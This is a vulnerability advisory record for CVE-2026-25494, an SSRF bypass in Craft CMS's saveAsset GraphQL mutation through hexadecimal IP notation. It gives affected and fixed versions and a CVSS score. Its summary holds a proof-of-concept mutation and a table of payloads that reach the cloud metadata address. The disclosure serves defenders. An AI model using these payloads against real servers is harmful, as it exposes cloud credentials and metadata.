@@ -1,0 +1,65 @@
+advisory_id: GHSA-m5r2-8p9x-hp5m
+datasource_id: github_osv_importer_v2/GHSA-m5r2-8p9x-hp5m
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-m5r2-8p9x-hp5m/GHSA-m5r2-8p9x-hp5m.json
+aliases:
+  - CVE-2026-25494
+summary: "Craft CMS Vulnerable to SSRF in GraphQL Asset Mutation via Alternative IP Notation\n\
+  I observed a [recent commit](https://github.com/craftcms/cms/commit/9d9b46a9e40cbdfb20d0d933abb546be12ccd3af)\
+  \ intended to mitigate Server-Side Request Forgery (SSRF) vulnerabilities. While the implemented\
+  \ defense mechanisms are an improvement, I have identified two methods to bypass these protections.\
+  \ This report details the first bypass method involving alternative IP notation, while the\
+  \ second method will be submitted in a separate advisory.\n\n---\n## Summary\n\nThe `saveAsset`\
+  \ GraphQL mutation uses `filter_var(..., FILTER_VALIDATE_IP)` to block a specific list of\
+  \ IP addresses. However, alternative IP notations (hexadecimal, mixed) are not recognized\
+  \ by this function, allowing attackers to bypass the blocklist and access cloud metadata services.\n\
+  \n---\n## Proof of Concept\n1. Send the following GraphQL mutation:\n```graphql\nmutation\
+  \ {\n    save_images_Asset(_file: { \n        url: \"http://169.254.0xa9fe/latest/meta-data/\"\
+  \n        filename: \"metadata.txt\"\n    }) {\n        id\n    }\n}\n```\n2. The IP validation\
+  \ passes (hex notation not recognized as IP)\n3. Guzzle resolves `169.254.0xa9fe` to `169.254.169.254`\n\
+  4. Cloud metadata is fetched and saved\n\n### Alternative Payloads\n| Payload | Notation |\
+  \ Resolves To |\n|---------|----------|-------------|\n| `http://169.254.0xa9fe/` | Mixed\
+  \ (decimal + hex) | 169.254.169.254 |\n| `http://0xa9.0xfe.0xa9.0xfe/` | Full hex dotted |\
+  \ 169.254.169.254 |\n| `http://0xa9fea9fe/` | Single hex integer | 169.254.169.254 |\n\n---\n\
+  ## Technical Details\n\n**File:** `src/gql/resolvers/mutations/Asset.php`\n**Root Cause:**\
+  \ `filter_var($hostname, FILTER_VALIDATE_IP)` only recognizes standard dotted-decimal notation.\
+  \ Hex representations bypass this check, but Guzzle still resolves them.\n\n```php\n// Line\
+  \ 287 - Fails to catch hex notation\nfilter_var($hostname, FILTER_VALIDATE_IP)\n```"
+impacted_packages:
+  - purl: pkg:composer/craftcms/cms
+    affected_versions: vers:composer/<=5.8.21
+    fixed_versions: vers:composer/5.8.22
+  - purl: pkg:composer/craftcms/cms
+    affected_versions: vers:composer/<=4.16.17
+    fixed_versions: vers:composer/4.16.18
+severities:
+  - score: '6.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-m5r2-8p9x-hp5m/GHSA-m5r2-8p9x-hp5m.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/craftcms/cms
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/commit/d49e93e5ba0c48939ce5eaa6cd9b4a990542d8b2
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/releases/tag/4.16.18
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/releases/tag/5.8.22
+    reference_type:
+    reference_id:
+  - url: https://github.com/craftcms/cms/security/advisories/GHSA-m5r2-8p9x-hp5m
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-25494
+    reference_type:
+    reference_id:
